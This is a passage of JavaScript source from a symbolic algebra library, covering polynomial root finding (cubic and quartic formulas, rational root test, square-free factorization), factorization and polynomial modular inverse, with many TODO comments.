          return true;
        }
      }

      return false;
    };

    if (!hasZeroCoefficient(np)) {
      var g = np.getCoefficient(n - 1).divide(np.getCoefficient(n)).divide(Expression.Integer.fromNumber(n));
      var ok = true;

      for (var k = np.getDegree() - 1; k >= 1 && ok; k -= 1) {
        ok = g.equals(np.getCoefficient(k - 1).divide(np.getCoefficient(k)).multiply(Expression.Integer.fromNumber(n - k + 1)).divide(Expression.Integer.fromNumber(k)));
      }

      if (ok) {
        var root = g.negate();

        for (var k = 0; k < n; k += 1) {
          roots.push(root);
        }

        np = Polynomial.of(np.getLeadingCoefficient());

        if (callback != undefined) {
          callback({
            content: content,
            roots: roots,
            newPolynomial: np,
            type: "(ax+b)**n"
          }); //TODO:
        }

        return roots;
      }
    }
  }

  if (np.getDegree() >= 2) {
    var root = np.doRationalRootTest();

    if (root != null) {
      //np = np.divideAndRemainder(Polynomial.of(root.getNumerator().negate(), root.getDenominator())).quotient;
      np = np.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient;
      roots.push(root);

      if (typeof hit === "function") {
        hit({
          getroots: {
            rational: ""
          }
        });
      }

      if (callback != undefined) {
        callback({
          content: content,
          roots: roots,
          newPolynomial: np,
          type: "useTheRationalRootTest"
        });
      }

      if (np.getDegree() > 0) {
        continueWithNewPolynomial(roots, np);
      }

      return roots;
    }
  } //TODO: depressed for all degrees (?) in Polynomial#getZeros() - ?


  if (!np.hasIntegerCoefficients() && np.getDegree() === 3) {
    //?
    // convert to depressed (?)
    // x = t - b / (n * a)
    var h = np._getShiftToDepressed();

    if (!h.equals(Expression.ZERO)) {
      var p = np._translateRoots(h);

      if (p.hasIntegerCoefficients()) {
        //?
        var zeros = p.getroots();

        if (zeros.length === 0) {
          //?
          zeros = p.getZeros();
          debugger;
        }

        if (zeros.length === np.getDegree()) {
          //?
          for (var iteratorzero = zeros[globalThis.Symbol.iterator](), zero = iteratorzero.next().value; zero != null; zero = iteratorzero.next().value) {
            roots.push(zero.subtract(h));
          }

          np = Polynomial.of(np.getLeadingCoefficient());

          if (callback != undefined) {
            callback({
              content: content,
              roots: roots,
              newPolynomial: np,
              type: "solveCubicEquation"
            });
          }

          return roots;
        } else {
          debugger;
        }
      }
    }
  }

  if (np.hasIntegerCoefficients()) {
    //?
    // convert to depressed (?)
    // x = t - b / (n * a)
    var n = np.getDegree();
    var a = np.getLeadingCoefficient();
    var b = np.getCoefficient(n - 1);

    if (!b.equals(Expression.ZERO)) {
      var h = b.divide(Expression.Integer.fromNumber(n).multiply(a));

      var depressed = np._translateRoots(h);

      var depressedRoots = [];

      if (callback != undefined) {
        //HACK:
        var originalCallback = callback;

        callback = function (info) {
          // https://en.wikipedia.org/wiki/Algebraic_equation#Elimination_of_the_sub-dominant_term
          originalCallback({
            content: content.multiply(depressed.getLeadingCoefficient().divide(np.getLeadingCoefficient()).inverse()),
            roots: roots,
            newPolynomial: depressed,
            type: "eliminationOfTheSubDominantTerm",
            b: b,
            n: n,
            a: a,
            newPolynomialVariable: new Expression.Symbol('t')
          });
          originalCallback(info);
          callback = originalCallback;
        };
      }

      continueWithNewPolynomial(depressedRoots, depressed, new Expression.Symbol('t')); //TODO: ?

      if (depressedRoots.length > 0) {
        for (var iteratordepressedRoot = depressedRoots[globalThis.Symbol.iterator](), depressedRoot = iteratordepressedRoot.next().value; depressedRoot != null; depressedRoot = iteratordepressedRoot.next().value) {
          roots.push(depressedRoot.subtract(h));
        }

        if (depressedRoots.length === depressed.getDegree()) {
          np = Polynomial.of(np.getLeadingCoefficient());
        } else {
          //?
          console.warn('TODO:'); //throw new TypeError();
          //TODO: !!!
        } //TODO: back substitution:
        //if (callback != undefined) {
        //  callback({content: content, roots: roots, newPolynomial: np, type: "t = x - b/(n*a)", g: "?"});//TODO: ?
        //}

      }

      return roots;
    }
  }

  if (np.getDegree() === 3) {
    // https://en.wikipedia.org/wiki/Cubic_function#Algebraic_solution
    var a = np.getCoefficient(3);
    var b = np.getCoefficient(2);
    var c = np.getCoefficient(1);
    var d = np.getCoefficient(0);
    var THREE = Expression.Integer.fromNumber(3);
    var h = b.divide(THREE.multiply(a));

    var substitute = function (y) {
      return y.subtract(h);
    };

    var tmp = np._translateRoots(h);

    var depressed = tmp.scale(tmp.getLeadingCoefficient().inverse());
    var p = depressed.getCoefficient(1);
    var q = depressed.getCoefficient(0);

    var discriminant = p.divide(THREE)._pow(3).add(q.divide(Expression.TWO)._pow(2));

    if (typeof hit === "function") {
      hit({
        getroots: {
          cubic: (discriminant instanceof Expression.Integer ? discriminant.compareTo(Expression.ZERO) : "?") + "-" + (p instanceof Expression.Integer ? p.compareTo(Expression.ZERO) : "?")
        }
      });
    }

    var minusOneOverTwo = Expression.ONE.negate().divide(Expression.TWO);
    var iSqrtOfThreeOverTwo = Expression.I.multiply(THREE.squareRoot()).divide(Expression.TWO);
    var cbrtOfMinusOne1 = minusOneOverTwo.subtract(iSqrtOfThreeOverTwo); // (-1-sqrt(3)*i)/2

    var cbrtOfMinusOne2 = minusOneOverTwo.add(iSqrtOfThreeOverTwo); // (-1+sqrt(3)*i)/2

    if (q.equals(Expression.ZERO) && p.equals(Expression.ZERO)) {
      //TODO: link to a^3+3a^2b+3ab^2+b^3=0 - ?
      // -b/(3*a)
      var root = substitute(Expression.ZERO);
      roots.push(root);
      roots.push(root);
      roots.push(root);
      np = Polynomial.of(np.getLeadingCoefficient());

      if (callback != undefined) {
        callback({
          content: content,
          roots: roots,
          newPolynomial: np,
          type: "solveCubicEquation"
        });
      }

      return roots;
    } else if (q.equals(Expression.ZERO)) {
      roots.push(substitute(Expression.ZERO));
      var tmp = nthRoot(2, p.negate(), np);
      roots.push(substitute(tmp));
      roots.push(substitute(tmp.negate()));
      np = Polynomial.of(np.getLeadingCoefficient());

      if (callback != undefined) {
        callback({
          content: content,
          roots: roots,
          newPolynomial: np,
          type: "solveCubicEquation"
        });
      }

      return roots;
    } else if (p.equals(Expression.ZERO)) {
      //TODO: should not reach this point (?) - should be solved by previous methods
      var tmp = nthRoot(3, q.negate(), np);
      roots.push(substitute(tmp));
      roots.push(substitute(tmp.multiply(cbrtOfMinusOne1)));
      roots.push(substitute(tmp.multiply(cbrtOfMinusOne2)));
      np = Polynomial.of(np.getLeadingCoefficient());

      if (callback != undefined) {
        callback({
          content: content,
          roots: roots,
          newPolynomial: np,
          type: "solveCubicEquation"
        });
      }

      return roots;
    } else if (discriminant.equals(Expression.ZERO)) {
      // https://github.com/nicolewhite/algebra.js/blob/master/src/equations.js
      // https://en.wikipedia.org/wiki/Cubic_equation#Multiple_root
      // a double root
      var t23 = THREE.multiply(q).divide(Expression.TWO.multiply(p)).negate();
      var root23 = substitute(t23);
      roots.push(root23);
      roots.push(root23);
      var t1 = t23.multiply(Expression.TWO).negate();
      var root1 = substitute(t1);
      roots.push(root1);
      np = Polynomial.of(np.getLeadingCoefficient());

      if (callback != undefined) {
        callback({
          content: content,
          roots: roots,
          newPolynomial: np,
          type: "solveCubicEquation"
        });
      }

      return roots;
    } else {
      // https://en.wikipedia.org/wiki/Cubic_equation#Cardano's_formula
      // 2*b^3-9*a*b*c+27*a^2*d
      var tmp = nthRoot(2, discriminant, np);

      if (tmp != undefined) {
        var C = nthRoot(3, q.negate().divide(Expression.TWO).add(tmp), np);

        if (C != undefined && !(C instanceof Expression.ExpressionPolynomialRoot) && !(C instanceof Expression.ExpressionWithPolynomialRoot)) {
          //TODO: !?
          var rootFromC = function (C) {
            return substitute(C.subtract(p.divide(THREE.multiply(C))));
          };

          roots.push(rootFromC(C));
          roots.push(rootFromC(C.multiply(cbrtOfMinusOne1)));
          roots.push(rootFromC(C.multiply(cbrtOfMinusOne2)));
          np = Polynomial.of(np.getLeadingCoefficient());

          if (callback != undefined) {
            callback({
              content: content,
              roots: roots,
              newPolynomial: np,
              type: "solveCubicEquation"
            });
          }

          return roots;
        }
      }
    }
  } //!2018-12-23


  if (np.getDegree() > 2) {
    // https://en.wikipedia.org/wiki/Square-free_polynomial
    var tmp = np.squareFreeFactors();
    var a0 = tmp.a0;
    var a1 = tmp.a1;

    if (a0.getDegree() > 0) {
      //TODO: merge with a code for Kronecker's method
      //TODO: factorization - ?
      var newA0 = a0;
      var a0r = a0.getroots(function (x) {
        newA0 = x.newPolynomial;
      });
      var previousRoot = null;

      for (var i = 0; i < a0r.length; i += 1) {
        var root = a0r[i];
        roots.push(root);

        if (previousRoot == null || !previousRoot.equals(root)) {
          roots.push(root);
        }

        previousRoot = root;
      } // find roots of a1 at first (for better performance):


      var newA1 = a1;
      var a1Roots = a1.getroots(function (x) {
        newA1 = x.newPolynomial;
      });

      for (var i = 0; i < a1Roots.length; i += 1) {
        roots.push(a1Roots[i]);
      }

      if (newA0 != null) {
        //TODO: test
        np = newA1.multiply(newA0).multiply(Polynomial.polynomialGCD(newA0, np));
      }

      if (a0r.length > 0 || a1Roots.length > 0) {
        if (typeof hit === "function") {
          hit({
            getroots: {
              squareFreeFactorization: np.toString()
            }
          });
        }

        if (callback != undefined) {
          //TODO: better details, t = sqrt(3), show the polynomial, ...
          callback({
            content: content,
            roots: roots,
            newPolynomial: np,
            type: "squareFreeFactorization"
          }); //?
        } //continueWithNewPolynomial(roots, np);


        return roots;
      }
    }
  } //!


  if (np.getDegree() >= 4) {
    if (true) {
      //TODO: !!! show correct method name in details
      var g = np.factorize();

      if (g != undefined) {
        var h = np.divideAndRemainder(g).quotient;
        var gNew = null;
        var gRoots = g.getroots(function (x) {
          gNew = x.newPolynomial.scale(x.content);
        });

        for (var i = 0; i < gRoots.length; i += 1) {
          roots.push(gRoots[i]); //np = np.divideAndRemainder(Polynomial.of(gRoots[i].negate(), Expression.ONE)).quotient;//TODO: optimize somehow - ?
        }

        if (gRoots.length > 0) {
          np = np.divideAndRemainder(g.divideAndRemainder(gNew).quotient).quotient;
        }

        var hNew = null;
        var hRoots = h.getroots(function (x) {
          hNew = x.newPolynomial.scale(x.content);
        });

        for (var i = 0; i < hRoots.length; i += 1) {
          roots.push(hRoots[i]); //np = np.divideAndRemainder(Polynomial.of(hRoots[i].negate(), Expression.ONE)).quotient;//TODO: optimize somehow - ?
        }

        if (hRoots.length > 0) {
          np = np.divideAndRemainder(h.divideAndRemainder(hNew).quotient).quotient;
        }

        if (hRoots.length > 0 || gRoots.length > 0) {
          if (typeof hit === "function") {
            hit({
              getroots: {
                methodOfKronecker: np.toString()
              }
            });
          }

          if (callback != undefined) {
            //TODO: better details
            callback({
              content: content,
              roots: roots,
              newPolynomial: np,
              type: "methodOfKronecker"
            }); //?
          }
        }

        return roots;
      }
    }
  } //TODO: ???
  //TODO: move up


  if (np.getDegree() >= 3) {
    for (var i = 0; i <= np.getDegree(); i += 1) {
      if (Expression.has(np.getCoefficient(i), Expression.SquareRoot)) {
        var c = null;

        Expression._map(function (x) {
          if (c == null) {
            //TODO: fix - ?
            if (x instanceof Expression.SquareRoot && x.a instanceof Expression.Integer) {
              c = x;
            }
          }

          return x;
        }, np.getCoefficient(i));

        if (c != null) {
          var tmp = new Expression.Symbol('_t'); //?
          // substitute

          var p = np.map(function (coefficient) {
            var s1 = Expression.ZERO; // Expression._map does not work here as it goes into Expression.Exponentiation: x**2 -> x**(t**2). It throws an exception.

            for (var iterators = coefficient.summands()[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
              var t = Expression.ONE;

              for (var iteratorx = s.factors()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
                if (x.equals(c)) {
                  t = t.multiply(tmp);
                } else if (x instanceof Expression.Integer) {
                  var exp = 0;

                  while (x.gcd(c.a).equals(c.a)) {
                    exp += 2;
                    x = x.divide(c.a);
                  }

                  t = t.multiply(x.multiply(tmp._pow(exp))); //?
                  //var q = x.truncatingDivide(c.a);
                  //var r = x.subtract(q.multiply(c.a));
                  //return q.multiply(tmp.multiply(tmp)).add(r);
                } else {
                  t = t.multiply(x);
                }
              }

              s1 = s1.add(t);
            }

            return s1;
          });
          var a = "_x" + ++counter;
          var newp = Polynomial.toPolynomial(p.calcAt(new Expression.Symbol(a)), tmp); //!2020-12-11

          var g = newp.getGCDOfTermDegrees();

          if (g >= 2) {
            var newData = new Array(Math.floor((newp.getDegree() + g) / g));
            var k = 0;

            for (var i1 = 0; i1 <= newp.getDegree(); i1 += g) {
              newData[k] = newp.getCoefficient(i1).multiply(c._pow(i1 - k));
              k += 1;
            }

            newp = Polynomial.from(newData);
          } //!


          if (newp.getDegree() > 1) {
            var roots1 = [];
            var rr = null; //TODO: ?

            while ((rr = newp.doRationalRootTest()) != null) {
              roots1.push(rr);
              newp = newp.divideAndRemainder(Polynomial.of(rr.negate(), Expression.ONE), "throw").quotient;
            } //TODO: details - ?
            //var roots1 = newp.getroots();


            var rootsCount = roots.length;

            for (var j = 0; j < roots1.length; j += 1) {
              //TODO: check
              var roots2 = Polynomial.toPolynomial(roots1[j].subtract(c).getNumerator(), new Expression.Symbol(a)).getroots();

              for (var k = 0; k < roots2.length; k += 1) {
                var root = roots2[k];
                roots.push(root);
                np = np.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient; //TODO: optimize somehow - ?
              }
            }

            if (roots.length > rootsCount) {
              if (typeof hit === "function") {
                hit({
                  getroots: {
                    methodOfIntroducingANewVariable: ""
                  }
                });
              }

              if (callback != undefined) {
                //TODO: better details, t = sqrt(3), show the polynomial, ...
                callback({
                  content: content,
                  roots: roots,
                  newPolynomial: np,
                  type: "methodOfIntroducingANewVariable",
                  t: c
                }); //?
              }

              continueWithNewPolynomial(roots, np);
              return roots; //TODO: when it is not all roots
            }
          }
        }
      }
    }
  }

  if (np.getDegree() === 4) {
    // https://en.wikipedia.org/wiki/Quartic_function
    // 1. coverting to a depressed quartic:
    var a_4 = np.getCoefficient(4);
    var p = np.scale(a_4.inverse());
    var b = p.getCoefficient(3);
    var y = new Expression.Symbol('$y');

    var substitute = function (y) {
      return y.subtract(b.divide(Expression.Integer.fromNumber(4)));
    };

    var e = p.calcAt(substitute(y));
    var sp = Polynomial.toPolynomial(e.getNumerator(), y); //TODO: ?

    var p = sp.getCoefficient(2);
    var q = sp.getCoefficient(1);
    var r = sp.getCoefficient(0); //var Q = nthRootInternal(3, );
    //var root = y0.subtract(b.divide(Expression.Integer.fromNumber(4)));
    // https://en.wikipedia.org/wiki/Quartic_function#Descartes'_solution

    var pU = Polynomial.of(q._pow(2).negate(), p._pow(2).subtract(Expression.TWO.add(Expression.TWO).multiply(r)), Expression.TWO.multiply(p), Expression.ONE); //TODO: when depressed cubic equation (?)
    //TODO: only one cubic equation root (?)

    var pURoots = pU.getCoefficient(1).equals(Expression.ZERO) && pU.getCoefficient(2).equals(Expression.ZERO) || pU.getCoefficient(0).equals(Expression.ZERO) ? pU.getroots() : [pU.doRationalRootTest() || Expression.ZERO];

    for (var iteratorU = pURoots[globalThis.Symbol.iterator](), U = iteratorU.next().value; U != null; U = iteratorU.next().value) {
      var u = nthRootInternal(2, U);

      if (!U.equals(Expression.ZERO) && u != null) {
        var s = u.negate();
        var t = p.add(u._pow(2)).add(q.divide(u)).divide(Expression.TWO);
        var v = p.add(u._pow(2)).subtract(q.divide(u)).divide(Expression.TWO); //TODO: details (factorization of two quadratic)

        var p1 = Polynomial.of(t, s, Expression.ONE);
        var p2 = Polynomial.of(v, u, Expression.ONE);
        var p12 = Polynomial.of(Expression.ONE);

        for (var iteratorroot = p1.getroots()[globalThis.Symbol.iterator](), root = iteratorroot.next().value; root != null; root = iteratorroot.next().value) {
          var s = substitute(root);
          roots.push(s);
          p12 = p12.multiply(Polynomial.of(s.negate(), Expression.ONE));
        }

        for (var iteratorroot = p2.getroots()[globalThis.Symbol.iterator](), root = iteratorroot.next().value; root != null; root = iteratorroot.next().value) {
          var s = substitute(root);
          roots.push(s);
          p12 = p12.multiply(Polynomial.of(s.negate(), Expression.ONE));
        }

        if (p12.getDegree() > 0) {
          np = np.divideAndRemainder(p12).quotient;

          if (callback != undefined) {
            callback({
              content: content,
              roots: roots,
              newPolynomial: np,
              type: "solveQuarticEcuation"
            }); //?
          }

          continueWithNewPolynomial(roots, np);
          return roots;
        }
      }
    } //debugger;
    //console.log(pURoots);

  }

  if (!np.hasIntegerCoefficients() && np.getDegree() > 2) {
    //?new
    var variable = new Expression.Symbol('$$');
    var e = np.calcAt(variable);
    var c = Expression.getConjugate(e);

    if (c != null) {
      var result = [];
      var newP = null;
      var ceRoots = Polynomial.toPolynomial(c.multiply(e), variable).getSquareFreePolynomial().getroots(function (x) {
        newP = x.newPolynomial;
      }); //TODO: details - ?

      for (var i = 0; i < ceRoots.length; i += 1) {
        var root = ceRoots[i];

        if (np.calcAt(root).equals(Expression.ZERO)) {
          roots.push(root); //TODO: this also filters out duplicate roots (?)
          //TODO: factorization may be not good, so this also needed to calc polynomial to continue the factorization

          np = np.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient; //TODO: optimize somehow - ?
        } else {
          //TODO:?
          console.debug(root);
        }
      }

      if (ceRoots.length > 0) {
        if (callback != undefined) {
          //TODO: better details, t = sqrt(3), show the polynomial, ...
          callback({
            content: content,
            roots: roots,
            newPolynomial: np,
            type: "multiplyByConjugates",
            t: c
          }); //?
        }

        continueWithNewPolynomial(roots, np);
      }

      return roots;
    }
  }

  if (np.getDegree() >= 0) {
    //TODO: fix
    if (typeof hit === "function") {
      hit({
        getroots: {
          other: np.getDegree()
        }
      });
    }
  }

  return roots;
};

Polynomial.prototype.derive = function () {
  var newData = new PolynomialData(this.a.size);

  for (var i = 0; i < this.a.size; i += 1) {
    var n = this.a.degree(i);
    var c = this.a.coefficient(i);

    if (n >= 1) {
      var nc = Expression.Integer.fromNumber(n).multiply(c);

      if (!nc.equals(Expression.ZERO)) {
        newData.add(n - 1, nc);
      }
    }
  }

  return new Polynomial(newData);
};

Polynomial.prototype.getSquareFreePolynomial = function () {
  //TODO: remove (it is not good for performance of the factoring)
  return this.divideAndRemainder(this.squareFreeFactors().a0).quotient;
};

Polynomial.prototype.isSquareFreePolynomial = function () {
  return this.squareFreeFactors().a0.equals(Polynomial.of(Expression.ONE));
}; // f = a_1 * a_2**2 * a_3**3 * ... * a_n**n
// a1 = a_1
// a0 = a_2**1 * a_3**2 * ... * a_n**(n-1)
// returns factor a1 - square free factor, a0 - a factor where the degree of every coprime factor is less by one


Polynomial.prototype.squareFreeFactors = function () {
  // https://en.wikipedia.org/wiki/Square-free_polynomial
  var p = this;
  var zero = 0;

  while (p.getCoefficient(zero).equals(Expression.ZERO)) {
    zero += 1;
  }

  p = p.divideAndRemainder(Polynomial.of(Expression.ONE).shift(zero), "throw").quotient;

  if (p.getDegree() !== 0) {
    var f = p;
    var d = f.derive();
    var a0 = Polynomial.polynomialGCD(f, d);

    if (a0.getDegree() !== 0) {
      if (Expression.isConstant(a0.getLeadingCoefficient())) {
        //TODO: ?
        a0 = a0.scale(a0.getLeadingCoefficient().inverse()); //TODO: ?
      }

      if (f.hasIntegerCoefficients()) {
        //?
        a0 = a0.scale(a0.getContent().inverse()); //?
      } //TODO: ?


      var b1 = f.divideAndRemainder(a0, f._hasIntegerLikeCoefficients() ? "throw" : undefined).quotient;
      var g1 = Polynomial.polynomialGCD(b1, a0);
      var a1 = b1.divideAndRemainder(g1, b1._hasIntegerLikeCoefficients() ? "throw" : undefined).quotient;
      return {
        a1: a1.shift(zero === 1 ? 1 : 0),
        a0: a0.shift(zero > 1 ? zero - 1 : 0)
      };
    }
  }

  return {
    a1: p.shift(zero === 1 ? 1 : 0),
    a0: Polynomial.of(Expression.ONE).shift(zero > 1 ? zero - 1 : 0)
  };
};

self.Polynomial = Polynomial; // TODO: tests:
// stringToPolynomial('x^4-1280*x^2+327680')._findGoodSubstitution().toString() === '16'
// stringToPolynomial('x^2-1280*x+1280')._findGoodSubstitution().toString() === '16'

Polynomial.prototype._findGoodSubstitution = function () {
  var f = function (polynomial) {
    var g = polynomial.getCoefficient(0).abs();

    for (var i = 0; i < polynomial.getDegree(); i += 1) {
      g = g.gcd(polynomial.getCoefficient(i).abs());
    }

    g = g.abs();
    var result = Expression.ONE;

    while (!g.equals(Expression.ONE)) {
      var p = g.primeFactor();

      if (!polynomial.getLeadingCoefficient().remainder(p).equals(Expression.ZERO)) {
        var ok = true;

        for (var i = 0; i < polynomial.getDegree() && ok; i += 1) {
          var x = p._pow(polynomial.getDegree() - i);

          ok = polynomial.getCoefficient(i).gcd(x).abs().equals(x);
        }

        if (ok) {
          result = result.multiply(p);
          polynomial = polynomial._scaleRoots(p.inverse()).primitivePart();
        }
      }

      g = g.truncatingDivide(p);
    }

    return result;
  };

  var n = f(this);
  return n.divide(f(this._scaleRoots(n.inverse())._exponentiateRoots(-1)));
};

Polynomial.prototype._getShiftToDepressed = function () {
  // for testing (?)
  var n = this.getDegree();
  var a = this.getLeadingCoefficient();
  var b = this.getCoefficient(n - 1);
  var h = b.divide(Expression.Integer.fromNumber(n).multiply(a)); //var depressed = this._translateRoots(h);
  //console.log(depressed);

  return h;
};

Polynomial.prototype._factorizeOverTheIntegers = function () {
  //return factorizeOverTheIntegers(this).next().value;
  return factorizeOverTheIntegers(this);
};

Polynomial.prototype._factorizeMultivariateIntegerPolynomial = function () {
  var varY = Polynomial._getY(this, this);

  var start = Date.now();

  var toTwoVariatePolynomial = function (polynomial, v2) {
    return polynomial.map(function (c) { return new Expression.Polynomial(Polynomial.toPolynomial(c, new Expression.Symbol(v2))); });
  };

  var f = factorizeOverTheIntegers._factorizeMultivariateIntegerPolynomial(toTwoVariatePolynomial(this, varY.symbol));

  var end = Date.now();

  if (end - start > 4) {
    console.log('_factorizeMultivariateIntegerPolynomial', end - start, this.toString());
  }

  if (f == null) {
    return null;
  }

  f = f.map(function (c) { return c.polynomial.calcAt(varY); });

  if (f.getLeadingCoefficient().isNegative()) {
    //TODO: move - ?
    f = f.negate();
  }

  return f;
};

Polynomial.prototype.factorize = function () {
  //if (this.getDegree() !== 3 && !this._canBeFactored()) {//TODO: ?
  //TODO: details - ?
  //  return undefined;
  //}
  if (this.getCoefficient(0).equals(Expression.ZERO)) {
    //?
    return Polynomial.of(Expression.ZERO, Expression.ONE);
  }

  if (this.getDegree() === 3) {//console.log(this.toString());
  }

  var content = this.getContent(); //?TODO: ?

  if (!content.equals(Expression.ONE) && !content.equals(Expression.ONE.negate())) {
    throw new RangeError();
  }

  if (this.getDegree() === 1) {
    return null;
  }

  if (this.getDegree() === 2) {
    var discriminant = function (p) {
      console.assert(p.getDegree() === 2);
      var a = p.getCoefficient(2);
      var b = p.getCoefficient(1);
      var c = p.getCoefficient(0);
      return b.multiply(b).subtract(Expression.Integer.fromNumber(4).multiply(a).multiply(c));
    };

    var d = discriminant(this); //TODO: not integer discriminants (?)

    if (d instanceof Expression.Integer && !d._isPerfectSquare()) {
      return null;
    }
  }

  var tmp = this.squareFreeFactors();

  if (tmp.a0.getDegree() > 0) {
    //TODO: ?
    if (tmp.a1.getDegree() > 0) {
      return tmp.a1;
    }

    return tmp.a0;
  }

  if (this.getDegree() < 2) {
    return null;
  } //!new


  if (this.hasIntegerCoefficients() && false) {
    var k = this._findGoodSubstitution();

    if (!k.equals(Expression.ONE)) {
      var newp = this._scaleRoots(k.inverse());

      newp = newp.scale(newp.getContent().inverse());
      console.log('_findGoodSubstitution', newp._log2hypot() / this._log2hypot());
      var f = newp.factorize();

      if (f != undefined) {
        return f._scaleRoots(k);
      }

      return null; //!?
    }
  }

  var n = this.getDegree();
  var b = this.getCoefficient(n - 1);

  if (!b.equals(Expression.ZERO) && !this.hasIntegerCoefficients()) {
    // conversion to depressed is slow (!) (large coefficients)
    var a = this.getLeadingCoefficient();
    var shift = b.divide(Expression.Integer.fromNumber(n).multiply(a));

    var depressed = this._translateRoots(shift);

    if (depressed.hasIntegerCoefficients()) {
      depressed = depressed.primitivePart(); //TODO: ?

      var factor = depressed.factorize();

      if (factor != null) {
        return factor._translateRoots(shift.negate()).primitivePart();
      }

      return null;
    } else {
      console.warn("???");
    }
  } //!
  //!new


  if (this.isEven()) {
    if (this.hasIntegerCoefficients() && (!this.getCoefficient(0).abs()._isPerfectSquare() || !this.getCoefficient(this.getDegree()).abs()._isPerfectSquare())) {
      var f = this._exponentiateRoots(2).factorize();

      if (f != undefined) {
        return f._exponentiateRoots(1 / 2);
      }

      return null;
    } //TODO: it should be factored into a product of (ax**(n/2)+...+bx+c) and (ax**(n/2)+...-bx+c)
    //if (this._factorByKroneckersMethod() != undefined) {
    //  debugger;
    //}

  }

  var g = this.getGCDOfTermDegrees();

  if (g > 2) {
    var f = this._exponentiateRoots(g).factorize();

    if (f != undefined) {
      return f._exponentiateRoots(1 / g);
    } //?

  } //!


  if (this.getDegree() < 4 || !this.hasIntegerCoefficients()) {
    //? avoid Polynomial#getZeros(...)
    var root = this.doRationalRootTest();

    if (root != null) {
      return Polynomial.of(root.getNumerator(), root.getDenominator().negate());
    }

    if (this.getDegree() < 4) {
      // https://math.stackexchange.com/questions/1138416/how-do-i-show-a-cubic-polynomial-does-not-factorise#answer-1138428
      return null;
    }
  } //!


  var np = this; //console.time('Kronecker\'s method');
  //TODO: ?

  if (!np.hasIntegerCoefficients()) {
    if (np._hasIntegerLikeCoefficients() && Polynomial._getY(np, np) != null) {
      //TODO: ?
      return np._factorizeMultivariateIntegerPolynomial();
    } //TODO: ?
    //return np._factorByKroneckersMethod();


    return null;
  }

  return np._factorizeOverTheIntegers(); //console.timeEnd('Kronecker\'s method');
};

Polynomial.prototype.primitivePart = function () {
  //return this.divideAndRemainder(Polynomial.of(this.getContent()), "throw").quotient;
  //TODO: test if this is faster:
  //var content = this.getContent();
  //return this.scale(content.getDenominator()).divideAndRemainder(Polynomial.of(content.getNumerator()), "throw").quotient;
  return this.scale(this.getContent().inverse());
}; //TODO: return primitivePart all the time


Polynomial.prototype.modularInverse = function (mod) {
  if (mod.getDegree() < 9 && this.getDegree() < mod.getDegree() && false || this.getDegree() < mod.getDegree() && mod.getDegree() <= 3) {
    //TODO: remove - ?
    var n = mod.getDegree();
    var e = this;
    var conjugate = Polynomial.of(n % 2 === 1 ? Expression.ONE : Expression.ONE.negate());

    while (e.getDegree() > 0) {
      var pseudoDivision = function (A, B) {
        var R = A;
        var Q = Polynomial.ZERO;

        while (R.getDegree() >= B.getDegree()) {
          var lc = R.getLeadingCoefficient();
          Q = Q.scale(B.getLeadingCoefficient());
          R = R.scale(B.getLeadingCoefficient());
          var q = Polynomial.of(lc.negate()).shift(R.getDegree() - B.getDegree());
          Q = Q.add(q);
          R = R.add(B.multiply(q));
        }

        return {
          Q: Q,
          R: R
        };
      };

      var tmp = pseudoDivision(mod.negate(), e);
      e = tmp.R;
      conjugate = conjugate.multiply(tmp.Q);
    }

    conjugate = conjugate.divideAndRemainder(mod).remainder; //TODO: 

    if (false) {
      var conjugate2 = polynomial.modularInverse(mod).primitivePart();
      var t = conjugate2.getLeadingCoefficient();
      var a = conjugate2.scale(conjugate.getLeadingCoefficient());
      var b = conjugate.scale(t);

      if (!b.equals(a)) {
        debugger;
      }
    }

    var C1 = conjugate; //return conjugate;

    if (mod.getDegree() <= 3) {
      return conjugate;
    }
  } // it is slow for both "integer coefficients" and "integer-like coefficients" somehow:


  var m = mod;
  var g = Math.gcd(this.getGCDOfTermDegrees(), m.getGCDOfTermDegrees());

  if (g > 1) {
    return this._exponentiateRoots(g).modularInverse(m._exponentiateRoots(g)).primitivePart()._exponentiateRoots(1 / g);
  }

  if (this.hasIntegerCoefficients() && m.hasIntegerCoefficients()) {//TODO: ???
  } //TODO: ?
  // https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm#Polynomial_extended_Euclidean_algorithm


  var a = this;
  var oldR = m;
  var r = a.getDegree() >= m.getDegree() ? Polynomial.pseudoRemainder(a, m).primitivePart() : a; //? faster than swap (?)
  //var r = a;

  /*if (oldR.getDegree() < r.getDegree()) {
    var tmp = oldR;
    oldR = r;
    r = tmp;
  }*/

  var oldT = Polynomial.of(Expression.ZERO);
  var t = Polynomial.of(Expression.ONE);
  var type = a._hasIntegerLikeCoefficients() && m._hasIntegerLikeCoefficients() || true ? "primitive" : "subresultant";

  for (var iteratortmp = Polynomial._pseudoRemainderSequence(oldR, r, type)[globalThis.Symbol.iterator](), tmp = iteratortmp.next().value; tmp != null; tmp = iteratortmp.next().value) {
    var scale = r.getLeadingCoefficient()._pow(oldR.getDegree() - r.getDegree() + 1);

    var quotient = tmp.q;
    var Î± = tmp.Î±;
    var newT = oldT.scale(scale).subtract(quotient.multiply(t));

    if (type === "primitive") {
      if (false) {
        newT = newT.scale(Î±.inverse());
      } else {
        var g = newT.getContent().gcd(Î±);
        newT = newT.divideAndRemainder(Polynomial.of(g), "throw").quotient;
        t = t.scale(Î±.divide(g)); //?
      }
    } else {
      newT = newT.divideAndRemainder(Polynomial.of(Î±), "throw").quotient;
    }

    var $newoldT = t;
    var $newt = newT;
    oldT = $newoldT;
    t = $newt;
    var newR = tmp.R;
    var $newoldR = r;
    var $newr = newR;
    oldR = $newoldR;
    r = $newr;
  }

  var gcd = oldR;

  if (gcd.getDegree() !== 0) {
    throw new TypeError(); //?
  }

  oldT = oldT.primitivePart().scale(m.getLeadingCoefficient()._pow(Math.max(oldT.getDegree() + a.getDegree() - m.getDegree() + 1, 0)));
  var r = oldT.multiply(a).divideAndRemainder(m, "throw").remainder;

  if (r.getDegree() !== 0) {
    throw new TypeError(); //?
  } // do not unscale for performance:
  //oldT = oldT.scale(r.getCoefficient(0).inverse());


  if (C1 != undefined) {
    console.log("!", C1.toString(), oldT.toString());
  }

  return oldT;
};
})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2 */

  

